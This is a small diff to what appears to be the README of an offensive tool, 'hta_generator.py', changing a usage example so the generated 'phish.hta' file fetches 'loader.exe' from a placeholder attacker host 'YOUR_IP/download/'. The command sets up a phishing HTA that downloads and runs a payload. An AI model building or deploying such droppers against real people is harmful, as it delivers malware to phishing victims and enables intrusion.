@@ -68,7 +68,7 @@ chmod +x hta_generator.py
 
 **Command-Line Mode:**
 ```bash
-./hta_generator.py -m 1 -H YOUR_IP -f loader.exe -o phish.hta
+./hta_generator.py -m 1 -H YOUR_IP/download/ -f loader.exe -o phish.hta
 ```
 
 **Generate All Methods:**
